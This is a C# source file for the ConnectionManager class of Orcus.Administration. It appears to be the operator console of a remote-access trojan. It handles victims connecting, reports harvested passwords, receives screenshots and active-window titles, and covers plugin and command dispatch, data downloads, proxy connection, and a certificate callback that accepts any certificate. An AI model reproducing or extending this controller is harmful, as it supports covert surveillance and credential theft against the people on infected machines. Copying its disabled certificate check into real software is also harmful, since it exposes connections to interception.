using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows;
using NLog;
using Orcus.Administration.Core.Args;
using Orcus.Administration.Core.ClientManagement;
using Orcus.Administration.Core.CommandManagement;
using Orcus.Administration.Core.Connection;
using Orcus.Administration.Core.Utilities;
using Orcus.Administration.Plugins.Administration;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Communication;
using Orcus.Shared.Compression;
using Orcus.Shared.Connection;
using Orcus.Shared.Core;
using Orcus.Shared.DataTransferProtocol;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.NetSerializer;
using Starksoft.Aspen.Proxy;
using IConnection = Orcus.Administration.Core.Connection.IConnection;
using Logger = Orcus.Administration.Core.Logging.Logger;
using PluginInfo = Orcus.Shared.Connection.PluginInfo;

namespace Orcus.Administration.Core
{
    public partial class ConnectionManager : IDisposable, IConnectionManager, IAdministrationConnectionManager
    {
        private const int ApiVersion = 9;
        private readonly object _clientListUpdateLock = new object();
        private readonly Func<byte> _readByteDelegate;
        private bool _isDisposed;
        private EventHandler<PackageInformation> _packageSentEventHandler;

        private ConnectionManager(string ip, int port, string password, IConnection connection)
        {
            DataTransferProtocolFactory = new DtpFactory(SendData);

            Ip = ip;
            Port = port;
            Password = password;
            Sender = new Sender(connection);

            var serializer = new Serializer(new[] {typeof (WelcomePackage)});

            StaticCommander = new StaticCommander(this);

            var welcomePackage = (WelcomePackage) serializer.Deserialize(connection.BaseStream);
            _readByteDelegate += Sender.Connection.BinaryReader.ReadByte;
            _readByteDelegate.BeginInvoke(EndRead, null);

            var data = DataTransferProtocolFactory.ExecuteFunction<LightInformation>("GetAllClientsLight");

            ClientProvider = new ClientProvider(data, DataTransferProtocolFactory);
            IpAddresses = welcomePackage.IpAddresses;
            ExceptionsCount = welcomePackage.ExceptionCount;
        }

        public void Dispose()
        {
            if (_isDisposed)
                return;

            _isDisposed = true;

            //Important that this line is above Sender.Dispose() because it sends the client to close the session
            CurrentController?.Dispose();

            Sender.Dispose();
            CurrentController = null;
        }

        public DtpFactory DataTransferProtocolFactory { get; }
        public ClientController CurrentController { get; set; }
        public Sender Sender { get; }
        public ClientProvider ClientProvider { get; }
        public string Password { get; }
        public string Ip { get; }
        public int Port { get; }
        public List<IpAddressInfo> IpAddresses { get; }
        public int ExceptionsCount { get; set; }

        public event EventHandler<OnlineClientInformation> ClientConnected;
        public event EventHandler<OnlineClientInformation> NewClientConnected;
        public event EventHandler<int> ClientDisconnected;
        public event EventHandler Disconnected;
        public event EventHandler LoginOpened;
        public event EventHandler<PluginLoadedEventArgs> PluginLoaded;
        public event EventHandler<PluginLoadedEventArgs> PluginLoadingFailed;
        public event EventHandler<List<int>> DataRemoved;
        public event EventHandler<List<int>> PasswordsRemoved;
        public event EventHandler<byte[]> DownloadDataReceived;
        public event EventHandler<PackageInformation> PackageReceived;
        public event EventHandler<byte[]> StaticCommandReceived;
        public event EventHandler<byte[]> StaticCommandTransmissionFailed;
        public event EventHandler<LibraryInformationEventArgs> LibraryInformationReceived;
        public event EventHandler<LibraryInformationEventArgs> LibraryLoadingResultReceived;

        public event EventHandler<List<int>> DynamicCommandsRemoved;
        public event EventHandler<RegisteredDynamicCommand> DynamicCommandAdded;
        public event EventHandler<List<DynamicCommandEvent>> DynamicCommandEventsAdded;
        public event EventHandler<DynamicCommandStatusUpdatedEventArgs> DynamicCommandStatusUpdated;
        public event EventHandler<ActiveCommandsUpdate> ActiveCommandsChanged;

        public event EventHandler<PackageInformation> PackageSent
        {
            add
            {
                _packageSentEventHandler += value;
                if (CurrentController != null)
                    ((Commander) CurrentController.Commander).ConnectionInfo.PackageSent += value;
            }
            remove
            {
                _packageSentEventHandler -= value;
                if (CurrentController != null)
                    ((Commander) CurrentController.Commander).ConnectionInfo.PackageSent -= value;
            }
        }

        private void SendData(byte[] data)
        {
            if (_isDisposed)
                return;

            lock (Sender.WriterLock)
            {
                Sender.Connection.BinaryWriter.Write((byte) FromAdministrationPackage.DataTransferProtocol);
                Sender.Connection.BinaryWriter.Write(data.Length);
                Sender.Connection.BinaryWriter.Write(data);
            }

            if (_packageSentEventHandler != null)
                OnPackageSent(DtpFactory.DescribeSentData(data, 0), data.Length + 5);
        }

        private void OnPackageSent(string description, long size)
        {
            _packageSentEventHandler?.Invoke(this,
                new PackageInformation
                {
                    Description = description,
                    IsReceived = false,
                    Size = size,
                    Timestamp = DateTime.Now
                });
        }

        private void EndRead(IAsyncResult asyncResult)
        {
            try
            {
                var parameter = _readByteDelegate.EndInvoke(asyncResult);
                var size = Sender.Connection.BinaryReader.ReadInt32();
                var bytes = Sender.Connection.BinaryReader.ReadBytes(size);
                Serializer serializer;
                OnlineClientInformation client;
                int clientId;

                PackageInformation packageInformation = null;
                if (PackageReceived != null)
                    packageInformation = new PackageInformation
                    {
                        Size = bytes.Length + 1,
                        Timestamp = DateTime.Now,
                        IsReceived = true
                    };

                switch ((FromClientPackage) parameter)
                {
                    case FromClientPackage.ResponseToAdministration:
                    case FromClientPackage.ResponseToAdministrationCompressed:
                        var isCompressed = parameter == (byte) FromClientPackage.ResponseToAdministrationCompressed;
                        var data = isCompressed
                            ? LZF.Decompress(bytes, 1)
                            : bytes;

                        if (packageInformation != null)
                            packageInformation.Description = (FromClientPackage) parameter + " " +
                                                             CurrentController.DescribePackage(bytes[0], data,
                                                                 isCompressed ? 0 : 1);
                        CurrentController?.PackageReceived(bytes[0], data, isCompressed ? 0 : 1);
                        break;
                    case FromClientPackage.ResponseLoginOpen:
                        clientId = BitConverter.ToInt32(bytes, 0);
                        client = _loginsPending.FirstOrDefault(x => x.Id == clientId);
                        if (client == null)
                        {
                            Logger.Error((string) Application.Current.Resources["CouldNotFindClient"]);
                            break;
                        }
                        _loginsPending.Remove(client);
                        Application.Current.Dispatcher.BeginInvoke(new Action(() =>
                        {
                            CurrentController = new ClientController(client, Sender, this);
                            ((Commander) CurrentController.Commander).ConnectionInfo.PackageSent +=
                                _packageSentEventHandler;
                            LoginOpened?.Invoke(this, EventArgs.Empty);
                        }));
                        break;
                    case FromClientPackage.NewClientConnected:
                        serializer =
                            new Serializer(new[] {typeof (ClientInformation), typeof (OnlineClientInformation)});
                        client = serializer.Deserialize<OnlineClientInformation>(bytes);
                        Logger.Info(string.Format((string) Application.Current.Resources["NewClientConnected"],
                            client.IpAddress, client.Port, client.UserName));

                        lock (_clientListUpdateLock)
                            Application.Current.Dispatcher.Invoke(() => ClientProvider.NewClientConnected(client));
                        NewClientConnected?.Invoke(this, client);
                        break;
                    case FromClientPackage.ClientConnected:
                        serializer =
                            new Serializer(new[] {typeof (ClientInformation), typeof (OnlineClientInformation)});
                        client = serializer.Deserialize<OnlineClientInformation>(bytes);
                        Logger.Info(string.Format((string) Application.Current.Resources["NewClientConnected"],
                            client.IpAddress, client.Port, client.UserName));

                        lock (_clientListUpdateLock)
                            Application.Current.Dispatcher.Invoke(() => ClientProvider.ClientConnected(client));

                        ClientConnected?.Invoke(this, client);
                        break;
                    case FromClientPackage.ClientDisconnected:
                        var disconnectedClientId = BitConverter.ToInt32(bytes, 0);
                        if (CurrentController != null && CurrentController.Client.Id == disconnectedClientId)
                        {
                            CurrentController.Dispose();
                            CurrentController = null;
                        }

                        lock (_clientListUpdateLock)
                            Application.Current.Dispatcher.Invoke(
                                () => ClientProvider.ClientDisconnected(disconnectedClientId));
                        ClientDisconnected?.Invoke(this, disconnectedClientId);
                        break;
                    case FromClientPackage.ComputerInformationAvailable:
                        var clientWithComputerInformationId = BitConverter.ToInt32(bytes, 0);
                        Application.Current.Dispatcher.BeginInvoke(
                            new Action(
                                () => ClientProvider.ComputerInformationAvailable(clientWithComputerInformationId)));
                        break;
                    case FromClientPackage.PasswordsAvailable:
                        var clientWithPasswordsId = BitConverter.ToInt32(bytes, 0);
                        ClientProvider.PasswordsAvailable(clientWithPasswordsId);
                        break;
                    case FromClientPackage.GroupChanged:
                        var newGroupNameLength = BitConverter.ToInt32(bytes, 0);
                        var newGroupName = Encoding.UTF8.GetString(bytes, 4, newGroupNameLength);
                        var clients = new Serializer(typeof (List<int>)).Deserialize<List<int>>(bytes,
                            4 + newGroupNameLength);

                        ClientProvider.ClientGroupChanged(clients, newGroupName);
                        Logger.Receive((string) Application.Current.Resources["GroupChanged"]);
                        break;
                    case FromClientPackage.ClientsRemoved:
                        serializer = new Serializer(typeof (List<int>));
                        var removedClientsIds = serializer.Deserialize<List<int>>(bytes);
                        lock (_clientListUpdateLock)
                            Application.Current.Dispatcher.Invoke(
                                () => ClientProvider.ClientRemoved(removedClientsIds));

                        if (removedClientsIds.Count == 1)
                            Logger.Receive((string) Application.Current.Resources["ClientRemoved"]);
                        else
                            Logger.Receive(string.Format((string) Application.Current.Resources["ClientsRemoved"],
                                removedClientsIds.Count));
                        break;
                    case FromClientPackage.DynamicCommandsRemoved:
                        DynamicCommandsRemoved?.Invoke(this,
                            new Serializer(typeof (List<int>)).Deserialize<List<int>>(bytes));
                        break;
                    case FromClientPackage.PluginLoaded:
                        clientId = BitConverter.ToInt32(bytes, 0);
                        var pluginInfo = new Serializer(typeof (PluginInfo)).Deserialize<PluginInfo>(bytes, 4);
                        ClientProvider.ClientPluginAvailable(clientId, pluginInfo);
                        PluginLoaded?.Invoke(this,
                            new PluginLoadedEventArgs(clientId, pluginInfo.Guid, pluginInfo.Version, true));
                        break;
                    case FromClientPackage.PluginLoadFailed:
                        clientId = BitConverter.ToInt32(bytes, 0);
                        PluginLoadingFailed?.Invoke(this,
                            new PluginLoadedEventArgs(clientId, new Guid(bytes.Skip(4).Take(16).ToArray()),
                                Encoding.ASCII.GetString(bytes.Skip(20).ToArray()), false));
                        break;
                    case FromClientPackage.DataTransferProtocolResponse:
                        if (packageInformation != null)
                            packageInformation.Description = "DataTransferProtocolResponse - " +
                                                             DataTransferProtocolFactory.DescribeReceivedData(bytes, 0);
                        DataTransferProtocolFactory.Receive(bytes);
                        break;
                    case FromClientPackage.ResponseActiveWindow:
                        clientId = BitConverter.ToInt32(bytes, 0);

                        var clientViewModel = ClientProvider.Clients.FirstOrDefault(x => x.Id == clientId);
                        if (clientViewModel != null)
                            clientViewModel.ActiveWindow = Encoding.UTF8.GetString(bytes, 4, bytes.Length - 4);
                        break;
                    case FromClientPackage.ResponseScreenshot:
                        clientId = BitConverter.ToInt32(bytes, 0);

                        var clientViewModel2 = ClientProvider.Clients.FirstOrDefault(x => x.Id == clientId);
                        if (clientViewModel2 != null)
                            using (var stream = new MemoryStream(bytes, 4, bytes.Length - 4))
                            using (var image = (Bitmap) Image.FromStream(stream))
                                clientViewModel2.Thumbnail = BitmapConverter.ToBitmapSource(image);
                        break;
                    case FromClientPackage.DataRemoved:
                        DataRemoved?.Invoke(this, new Serializer(typeof (List<int>)).Deserialize<List<int>>(bytes));
                        break;
                    case FromClientPackage.PasswordsRemoved:
                        var clientIds = new Serializer(typeof (List<int>)).Deserialize<List<int>>(bytes);
                        foreach (var id in clientIds)
                            ClientProvider.PasswordsRemoved(id);

                        PasswordsRemoved?.Invoke(this, clientIds);
                        break;
                    case FromClientPackage.DataDownloadPackage:
                        DownloadDataReceived?.Invoke(this, bytes);
                        break;
                    case FromClientPackage.StaticCommandPluginReceived:
                        StaticCommandReceived?.Invoke(this, bytes);
                        break;
                    case FromClientPackage.StaticCommandPluginTransmissionFailed:
                        StaticCommandTransmissionFailed?.Invoke(this, bytes);
                        break;
                    case FromClientPackage.DynamicCommandAdded:
                        DynamicCommandAdded?.Invoke(this,
                            new Serializer(RegisteredDynamicCommand.RequiredTypes).Deserialize<RegisteredDynamicCommand>(bytes));
                        break;
                    case FromClientPackage.DynamicCommandEventsAdded:
                        DynamicCommandEventsAdded?.Invoke(this,
                            new Serializer(typeof (List<DynamicCommandEvent>)).Deserialize<List<DynamicCommandEvent>>(
                                bytes));
                        break;
                    case FromClientPackage.DynamicCommandStatusUpdate:
                        DynamicCommandStatusUpdated?.Invoke(this,
                            new DynamicCommandStatusUpdatedEventArgs(BitConverter.ToInt32(bytes, 0),
                                (DynamicCommandStatus) bytes[4]));
                        break;
                    case FromClientPackage.ResponseLibraryInformation:
                        LibraryInformationReceived?.Invoke(this,
                            new LibraryInformationEventArgs(BitConverter.ToInt32(bytes, 0),
                                (PortableLibrary) BitConverter.ToInt32(bytes, 4)));
                        break;
                    case FromClientPackage.ResponseLibraryLoadingResult:
                        LibraryLoadingResultReceived?.Invoke(this,
                            new LibraryInformationEventArgs(BitConverter.ToInt32(bytes, 0),
                                (PortableLibrary) BitConverter.ToInt32(bytes, 4)));
                        break;
                    case FromClientPackage.ActiveCommandsChanged:
                        ActiveCommandsChanged?.Invoke(this,
                            new Serializer(typeof(ActiveCommandsUpdate)).Deserialize<ActiveCommandsUpdate>(bytes, 0));
                        break;
                    default:
                        throw new ArgumentOutOfRangeException();
                }

                if (packageInformation != null)
                {
                    if (string.IsNullOrEmpty(packageInformation.Description))
                        packageInformation.Description = ((FromClientPackage) parameter).ToString();
                    PackageReceived?.Invoke(this, packageInformation);
                }

                _readByteDelegate.BeginInvoke(EndRead, null);
            }
            catch (Exception ex)
            {
	            if (!(ex is IOException) || ex.HResult != -2147024858)
	            {
					LogManager.GetCurrentClassLogger().Warn(ex, "Disconnected from server");
		            if (Application.Current != null)
			            Logger.Error(string.Format((string) Application.Current.Resources["DisconnectedFromServerException"],
				            ex.Message));
	            } else if (Application.Current != null)
	            {
	                Logger.Warn((string) Application.Current.Resources["DisconnectedFromServer"]);
	            }

	            else
	                LogManager.GetCurrentClassLogger().Warn("NullReference");

                Dispose();
                Disconnected?.Invoke(this, EventArgs.Empty);
            }
        }

        public static ConnectionResult ConnectToServer(string ip, int port, string password,
            out ConnectionManager connectionManager)
        {
            connectionManager = null;
            TcpClient client;
            SslStream stream;
            if (TryConnect(out client, out stream, ip, port))
            {
                Logger.Receive((string) Application.Current.Resources["ConnectionSuccessful"]);

                var binaryWriter = new BinaryWriter(stream);
                var binaryReader = new BinaryReader(stream);

                int serverApiVersion;
                var apiCheckResult = ApiVersionCheck(binaryReader, binaryWriter, out serverApiVersion);

                if (apiCheckResult == false)
                {
                    binaryReader.Dispose();
                    binaryWriter.Dispose();
                    stream.Dispose();
                    client.Close();
                    Logger.Error(string.Format((string) Application.Current.Resources["InvalidApiVersion"],
                        serverApiVersion,
                        ApiVersion));
                    return new ConnectionResult(false,
                        string.Format((string) Application.Current.Resources["InvalidApiVersion"], serverApiVersion,
                            ApiVersion));
                }

                IConnection serverConnection;
                if (apiCheckResult == null)
                {
                    Logger.Receive((string) Application.Current.Resources["ServerOffersNamedPipeConnection"]);
                    binaryWriter.Write(true);
                    var pipeName = binaryReader.ReadString();
                    var namedPipeClientStream = new NamedPipeClientStream(".", pipeName, PipeDirection.InOut,
                        PipeOptions.Asynchronous);
                    namedPipeClientStream.Connect(5000);

                    binaryReader.Dispose();
                    binaryWriter.Dispose();
                    stream.Dispose();
                    client.Close();

                    if (!namedPipeClientStream.IsConnected)
                    {
                        namedPipeClientStream.Dispose();
                        return new ConnectionResult(false, "Timeout");
                    }

                    Logger.Receive((string) Application.Current.Resources["ConnectedToNamedPipe"]);
                    serverConnection = new NamedPipeConnection(namedPipeClientStream);
                }
                else
                {
                    serverConnection = new TcpConnection(client, binaryReader, binaryWriter, stream);
                }

                if (Authenticate(serverConnection, password))
                {
                    Logger.Receive((string) Application.Current.Resources["AuthenticationSuccessful"]);
                    connectionManager =
                        Application.Current.Dispatcher.Invoke(
                            () => new ConnectionManager(ip, port, password, serverConnection));
                    return new ConnectionResult(true);
                }

                Logger.Error((string) Application.Current.Resources["CouldNotAuthenticate"]);
                serverConnection.Dispose();
                return new ConnectionResult(false, (string) Application.Current.Resources["CouldNotAuthenticate"]);
            }

            return new ConnectionResult(false, (string) Application.Current.Resources["ConnectionRefused"]);
        }

        public void CloseCurrentController()
        {
            CurrentController?.Dispose();
            CurrentController = null;
        }

        private static bool Authenticate(IConnection connection, string password)
        {
            Logger.Receive((string) Application.Current.Resources["GetPassword"]);
            connection.BinaryWriter.Write(password);
            Logger.Send(string.Format((string) Application.Current.Resources["SendPassword"],
                new string('*', password.Length)));

            return connection.BinaryReader.ReadByte() == (byte) AuthentificationFeedback.Accepted;
        }

        private static bool TryConnect(out TcpClient tcpClient, out SslStream stream, string ip, int port)
        {
            tcpClient = null;
            stream = null;

	        TcpClient client;
	        if (Settings.Current.UseProxyToConnectToServer)
	        {
		        IProxyClient proxyClient;
		        switch (Settings.Current.ProxyType)
		        {
			        case ProxyType.Socks4:
				        proxyClient = new Socks4ProxyClient();
				        break;
			        case ProxyType.Socks4a:
				        proxyClient = new Socks4aProxyClient();
				        break;
			        case ProxyType.Socks5:
				        proxyClient = new Socks5ProxyClient();
				        if (Settings.Current.ProxyAuthenticate)
				        {
					        ((Socks5ProxyClient) proxyClient).ProxyUserName = Settings.Current.ProxyUsername;
					        ((Socks5ProxyClient) proxyClient).ProxyPassword = Settings.Current.ProxyPassword;
				        }
				        break;
			        default:
				        throw new ArgumentOutOfRangeException();
		        }

		        proxyClient.ProxyHost = Settings.Current.ProxyIpAddress;
		        proxyClient.ProxyPort = Settings.Current.ProxyPort;
		        client = proxyClient.CreateConnection(ip, port);
	        }
	        else
	        {
				client = new TcpClient();
				try
				{
					var result = client.BeginConnect(ip, port, null, null);
					var success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(3));

					if (!success)
						return false;

					// we are connected
					client.EndConnect(result);
				}
				catch (Exception)
				{
					return false;
				}
			}

	        var sslStream = new SslStream(client.GetStream(), false, UserCertificateValidationCallback);

	        try
	        {
		        var serverName = Environment.MachineName;
	            var result = sslStream.BeginAuthenticateAsClient(serverName, null, null);
	            var success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(3));
	            if (!success)
	                return false;

                sslStream.EndAuthenticateAsClient(result);
	        }
	        catch (AuthenticationException)
	        {
		        sslStream.Dispose();
		        client.Close();
		        return false;
	        }

	        sslStream.Write(new[] {(byte) AuthentificationIntention.Administration});

	        tcpClient = client;
	        stream = sslStream;
	        return true;
        }

	    private static bool? ApiVersionCheck(BinaryReader binaryReader, BinaryWriter binaryWriter, out int serverApiVersion)
	    {
		    serverApiVersion = -1;
		    binaryWriter.Write(ApiVersion);

	        switch ((AuthentificationFeedback)binaryReader.ReadByte())
	        {
	            case AuthentificationFeedback.ApiVersionOkayGetPassword:
	                return true;
	            case AuthentificationFeedback.ApiVersionOkayWantANamedPipe:
	                return null;
                case AuthentificationFeedback.InvalidApiVersion:
                    serverApiVersion = binaryReader.ReadInt32();
                    return false;
	            default:
	                throw new ArgumentOutOfRangeException();
	        }
	    }

        private static bool UserCertificateValidationCallback(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }
    }
}